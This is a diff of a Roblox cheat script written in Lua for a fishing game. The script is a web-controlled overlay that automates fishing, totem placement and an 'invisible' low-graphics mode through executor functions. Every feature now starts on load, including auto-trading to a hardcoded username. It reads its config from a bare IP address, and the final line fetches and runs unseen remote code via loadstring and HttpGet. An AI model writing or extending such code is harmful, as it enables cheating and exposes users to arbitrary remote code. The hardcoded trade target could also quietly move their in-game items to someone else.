@@ -1,9 +1,9 @@
 -- ======================================================
 -- ULTIMATE WEB-CONTROLLED OVERLAY: COMPLETE AREA EDITION
--- [FISHING + ALL AREAS + AUTO TOTEM + TRADE LOCK < 5M + POTATO MODE]
+-- [FISHING + ALL AREAS + AUTO TOTEM + TRADE LOCK < 5M + INVISIBLE POTATO]
 -- ======================================================
 
-local CONFIG_URL = "http://165.232.148.115:5000/config.json" --
+local CONFIG_URL = "http://165.232.148.115:5000/config.json"
 
 -- ===============================
 -- 1. GLOBAL SERVICES & BYPASSES
@@ -14,6 +14,7 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local Lighting = game:GetService("Lighting")
+local TweenService = game:GetService("TweenService")
 local lp = Players.LocalPlayer
 
 -- ANTI-AFK
@@ -90,7 +91,7 @@ end
 local SecretLabel = CreateLabel("SecretLabel", Color3.fromRGB(255, 215, 0))
 local DistanceLabel = CreateLabel("DistanceLabel", Color3.fromRGB(80, 255, 80))
 local LocationLabel = CreateLabel("LocationLabel", Color3.fromRGB(0, 180, 255))
-local TotemLabel = CreateLabel("TotemLabel")
+local TotemLabel = CreateLabel("TotemLabel", Color3.fromRGB(200, 0, 200))
 local TradeLabel = CreateLabel("TradeLabel")
 local FishLabel = CreateLabel("FishLabel")
 local PotatoLabel = CreateLabel("PotatoLabel", Color3.fromRGB(255, 165, 0))
@@ -160,101 +161,152 @@ local PotatoLoop = nil
 
 local TOTEM_ID = 2 -- Mutation Totem ID
 local TOTEM_NAME = "Mutation Totem"
-
-local function GetFishRarity(item)
-    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
-    if ItemUtility and item.Id then
-        pcall(function()
-            local data = ItemUtility:GetItemData(item.Id)
-            if data and data.Probability and TierUtility then
-                local tier = TierUtility:GetTierFromRarity(data.Probability.Chance)
-                if tier and tier.Name then rarity = tier.Name end
-            end
-        end)
-    end
-    return tostring(rarity):upper()
-end
+local TOTEM_INTERVAL = 3700 -- 3700 detik (61.67 menit)
 
 -- ===============================
--- 5. POTATO MODE SYSTEM
+-- 5. EXTREME INVISIBLE POTATO MODE
 -- ===============================
-local function ApplyPotatoMode()
-    -- Optimize Lighting
+local function ApplyExtremeInvisibleMode()
+    -- EXTREME LIGHTING OPTIMIZATION
     pcall(function()
         Lighting.GlobalShadows = false
         Lighting.FogEnd = 9e9
         Lighting.Brightness = 0
+        Lighting.ClockTime = 12
+        Lighting.GeographicLatitude = 0
+        Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+        Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+        Lighting.ExposureCompensation = 0
         
         if workspace.Terrain then
             workspace.Terrain.WaterWaveSize = 0
-            workspace.Terrain.WaterTransparency = 1 
+            workspace.Terrain.WaterTransparency = 1
             workspace.Terrain.WaterReflectance = 0
+            workspace.Terrain.WaterColor = Color3.fromRGB(0, 0, 0)
         end
     end)
     
-    -- Optimize all parts in the game
-    for _, v in ipairs(game:GetDescendants()) do
-        pcall(function()
-            if v:IsA("BasePart") or v:IsA("MeshPart") then
-                v.Material = Enum.Material.SmoothPlastic
-                v.Reflectance = 0
-                v.CastShadow = false
-            elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
-                v:Destroy()
-            end
-        end)
-    end
-    
-    -- Optimize player's character
+    -- INVISIBLE PLAYER
     local char = lp.Character
     if char then
         for _, v in ipairs(char:GetDescendants()) do
             pcall(function()
                 if v:IsA("BasePart") or v:IsA("MeshPart") then
-                    v.Material = Enum.Material.SmoothPlastic
+                    v.Transparency = 1
                     v.Reflectance = 0
                     v.CastShadow = false
+                    v.Material = Enum.Material.SmoothPlastic
                 elseif v:IsA("Decal") or v:IsA("Texture") then
                     v:Destroy()
+                elseif v:IsA("Accessory") then
+                    local handle = v:FindFirstChild("Handle")
+                    if handle and (handle:IsA("BasePart") or handle:IsA("MeshPart")) then
+                        handle.Transparency = 1
+                    end
                 end
             end)
         end
+        
+        -- Make humanoid invisible
+        local humanoid = char:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            pcall(function()
+                humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+            end)
+        end
+    end
+    
+    -- INVISIBLE MAP & OBJECTS
+    for _, v in ipairs(workspace:GetDescendants()) do
+        pcall(function()
+            if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("Part") then
+                v.Transparency = 1
+                v.Reflectance = 0
+                v.CastShadow = false
+                v.Material = Enum.Material.SmoothPlastic
+                
+                -- Remove any surface appearances
+                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                    local surface = v:FindFirstChild(face.Name .. "Surface")
+                    if surface then surface:Destroy() end
+                end
+            elseif v:IsA("Model") and not v:IsA("Tool") then
+                v.PrimaryPart = nil
+            elseif v:IsA("Decal") or v:IsA("Texture") or 
+                   v:IsA("ParticleEmitter") or v:IsA("Trail") or 
+                   v:IsA("Beam") or v:IsA("Smoke") or 
+                   v:IsA("Fire") or v:IsA("Sparkles") then
+                v:Destroy()
+            end
+        end)
+    end
+    
+    -- REMOVE ALL VISUAL EFFECTS
+    local effects = workspace:FindFirstChild("Effects")
+    if effects then effects:ClearAllChildren() end
+    
+    local cosmeticFolder = workspace:FindFirstChild("CosmeticFolder")
+    if cosmeticFolder then cosmeticFolder:ClearAllChildren() end
+    
+    -- DISABLE ANIMATIONS
+    if char then
+        local animateScript = char:FindFirstChild("Animate")
+        if animateScript and animateScript:IsA("LocalScript") then
+            animateScript.Enabled = false
+        end
+        local animator = char:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator")
+        if animator then animator:Destroy() end
+    end
+    
+    -- FPS CAP
+    if setfpscap then
+        pcall(function()
+            setfpscap(10) -- Ultra low FPS for maximum performance
+        end)
     end
 end
 
-local function StartPotatoLoop()
+local function StartInvisiblePotatoLoop()
     if PotatoLoop then return end
     
-    ApplyPotatoMode() -- Apply immediately
-    PotatoLabel.Text = "Potato Mode: Active"
+    ApplyExtremeInvisibleMode() -- Apply immediately
+    PotatoLabel.Text = "Invisible Mode: ACTIVE"
     
     PotatoLoop = task.spawn(function()
         while PotatoModeEnabled do
-            ApplyPotatoMode()
-            task.wait(3) -- Reapply every 3 seconds
+            ApplyExtremeInvisibleMode()
+            task.wait(2) -- Reapply every 2 seconds for maximum effect
         end
         PotatoLoop = nil
     end)
 end
 
-local function StopPotatoMode()
+local function StopInvisibleMode()
     if PotatoLoop then
         task.cancel(PotatoLoop)
         PotatoLoop = nil
     end
-    PotatoLabel.Text = "Potato Mode: Inactive"
+    PotatoLabel.Text = "Invisible Mode: Inactive"
+    
+    -- Reset FPS cap
+    if setfpscap then
+        pcall(function()
+            setfpscap(60)
+        end)
+    end
 end
 
 -- Auto reapply when character changes
-lp.CharacterAdded:Connect(function()
+lp.CharacterAdded:Connect(function(newChar)
     if PotatoModeEnabled then
-        task.wait(0.5)
-        ApplyPotatoMode()
+        task.wait(0.3)
+        ApplyExtremeInvisibleMode()
     end
 end)
 
 -- ===============================
--- 6. AUTO TOTEM SYSTEM (PLACE WHERE CHARACTER STANDS)
+-- 6. AUTO TOTEM SYSTEM - 3700 DETIK
 -- ===============================
 local function GetTotemUUID()
     local success, inventoryData = pcall(function() 
@@ -277,11 +329,13 @@ local function SpawnMutationTotem()
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     
     if not hrp then 
+        print("[Totem] No character/HRP found")
         return false
     end
 
     local uuid = GetTotemUUID()
     if not uuid then
+        print("[Totem] No Mutation Totem in inventory")
         return false
     end
 
@@ -293,6 +347,9 @@ local function SpawnMutationTotem()
         if RE_SpawnTotem then
             RE_SpawnTotem:FireServer(uuid)
             success = true
+            print("[Totem] Successfully placed at current position")
+        else
+            print("[Totem] RE/SpawnTotem remote not found")
         end
     end)
     
@@ -312,37 +369,36 @@ local function StartAutoTotemLoop()
     StopAutoTotem()
     
     TotemThread = task.spawn(function()
-        print("[Totem] Placing first totem immediately...")
-        task.wait(2)
-        
-        local firstSuccess = SpawnMutationTotem()
-        
-        if firstSuccess then
-            print("[Totem] First totem placed. Starting 63-minute timer.")
-        else
-            print("[Totem] Failed to place first totem. Will retry in 5 minutes.")
-            task.wait(300)
-        end
+        local countdown = TOTEM_INTERVAL
         
         while AutoTotemEnabled do
-            local waitTime = 3780 -- 63 minutes
-            
-            for i = waitTime, 1, -1 do
+            -- Update timer display
+            for i = countdown, 0, -1 do
                 if not AutoTotemEnabled then break end
+                
+                local minutes = math.floor(i / 60)
+                local seconds = i % 60
+                TotemLabel.Text = string.format("Totem: %02d:%02d", minutes, seconds)
+                
                 task.wait(1)
             end
             
             if not AutoTotemEnabled then break end
             
-            print("[Totem] Attempting to place Mutation Totem...")
+            -- Place totem
+            print(string.format("[Totem] Placing Mutation Totem (every %d seconds)", TOTEM_INTERVAL))
             local success = SpawnMutationTotem()
             
             if success then
-                print("[Totem] Successfully placed Mutation Totem.")
+                print("[Totem] Successfully placed Mutation Totem")
+                TotemLabel.Text = "Totem: Placed! (3700s)"
             else
-                print("[Totem] Failed to place Mutation Totem. Retrying in 5 minutes.")
-                task.wait(300)
+                print("[Totem] Failed to place totem, retrying in 60 seconds")
+                TotemLabel.Text = "Totem: Failed - Retry in 60s"
+                task.wait(60) -- Retry after 60 seconds if failed
             end
+            
+            countdown = TOTEM_INTERVAL
         end
         
         TotemThread = nil
@@ -365,8 +421,18 @@ end
 local function StartFishingV1()
     if #FishingThreads > 0 then return end
     pcall(function() GetRemote("RF/UpdateAutoFishingState"):InvokeServer(true) end)
-    table.insert(FishingThreads, task.spawn(function() while FishingConfig.Enabled do RunInstantFish() task.wait(0.1) end end))
-    table.insert(FishingThreads, task.spawn(function() while FishingConfig.Enabled do pcall(function() GetRemote("RE/EquipToolFromHotbar"):FireServer(1) end) task.wait(0.5) end end))
+    table.insert(FishingThreads, task.spawn(function() 
+        while FishingConfig.Enabled do 
+            RunInstantFish() 
+            task.wait(0.1) 
+        end 
+    end))
+    table.insert(FishingThreads, task.spawn(function() 
+        while FishingConfig.Enabled do 
+            pcall(function() GetRemote("RE/EquipToolFromHotbar"):FireServer(1) end) 
+            task.wait(0.5) 
+        end 
+    end))
 end
 
 local function StopFishing()
@@ -436,7 +502,7 @@ end)
 -- 10. WEB SYNC
 -- ===============================
 local function UpdateFromWeb(new)
-    -- Auto Totem Control
+    -- Auto Totem Control (3700 detik)
     if new.AutoTotem ~= nil then
         AutoTotemEnabled = new.AutoTotem
         TotemLabel.Text = "Auto Totem: " .. tostring(AutoTotemEnabled)
@@ -448,15 +514,15 @@ local function UpdateFromWeb(new)
         end
     end
     
-    -- Potato Mode Control
+    -- Invisible Potato Mode Control
     if new.PotatoMode ~= nil then
         PotatoModeEnabled = new.PotatoMode
-        PotatoLabel.Text = "Potato Mode: " .. tostring(PotatoModeEnabled)
+        PotatoLabel.Text = "Invisible Mode: " .. tostring(PotatoModeEnabled)
         
         if PotatoModeEnabled then
-            StartPotatoLoop()
+            StartInvisiblePotatoLoop()
         else
-            StopPotatoMode()
+            StopInvisibleMode()
         end
     end
     
@@ -529,43 +595,53 @@ end)
 -- ===============================
 -- 11. INITIALIZATION
 -- ===============================
-print("[System] Complete Integrated Version Loading...")
+print("[System] ULTIMATE INVISIBLE EDITION Loading...")
 
--- Start with initial web sync
-task.delay(1, function()
-    local success, res = pcall(function() return game:HttpGet(CONFIG_URL) end)
-    if success then
-        local ds, data = pcall(function() return HttpService:JSONDecode(res) end)
-        if ds then
-            UpdateFromWeb(data)
-            print("[System] Initial config loaded from web")
+-- Auto-start all features based on your config
+task.delay(2, function()
+    -- Start Invisible Potato Mode immediately
+    PotatoModeEnabled = true
+    StartInvisiblePotatoLoop()
+    PotatoLabel.Text = "Invisible Mode: ACTIVE"
+    
+    -- Start Auto Totem (3700 detik)
+    AutoTotemEnabled = true
+    StartAutoTotemLoop()
+    
+    -- Start Fishing at Crater Island
+    FishingConfig = {Enabled = true, Area = "Crater Island"}
+    if AreaData["Crater Island"] then
+        local data = AreaData["Crater Island"]
+        local char = lp.Character
+        if char then
+            local root = char:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.CFrame = CFrame.new(data.Pos, data.Pos + data.Look)
+                task.wait(1)
+            end
         end
     end
+    StartFishingV1()
+    LocationLabel.Text = "Location: Crater Island"
+    FishLabel.Text = "Auto Fishing: true"
     
-    -- Default values if web fails
-    if not success then
-        -- Start with config.json values
-        AutoTotemEnabled = true
-        PotatoModeEnabled = true
-        FishingConfig = {Enabled = true, Area = "Crater Island"}
-        TradingConfig = {AutoTrade = true, TargetUsername = "mm3kenak", Delay = 6}
-        
-        -- Start systems
-        if AutoTotemEnabled then StartAutoTotemLoop() end
-        if PotatoModeEnabled then StartPotatoLoop() end
-        if FishingConfig.Enabled then StartFishingV1() end
-        if TradingConfig.AutoTrade then RunAutoTrade() end
-        
-        -- Update UI
-        TotemLabel.Text = "Auto Totem: true"
-        PotatoLabel.Text = "Potato Mode: true"
-        LocationLabel.Text = "Location: Crater Island"
-        FishLabel.Text = "Auto Fishing: true"
-        TradeLabel.Text = "Auto Trade: true"
-        
-        print("[System] Using default config values")
-    end
+    -- Start Trading
+    TradingConfig = {AutoTrade = true, TargetUsername = "mm3kenak", Delay = 6}
+    task.spawn(function()
+        local s, id = pcall(function() return Players:GetUserIdFromNameAsync("mm3kenak") end)
+        if s then 
+            TradingConfig.TargetId = id
+            RunAutoTrade()
+        end
+    end)
+    TradeLabel.Text = "Auto Trade: true"
+    
+    print("[System] ALL SYSTEMS ACTIVE:")
+    print("- Invisible Potato Mode: ON")
+    print("- Auto Totem: EVERY 3700s")
+    print("- Auto Fishing: Crater Island")
+    print("- Auto Trade: mm3kenak")
 end)
 
-print("[System] Initialized - Ready for web control")
+print("[System] READY - Web Controlled Overlay Active")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/tormoni"))()
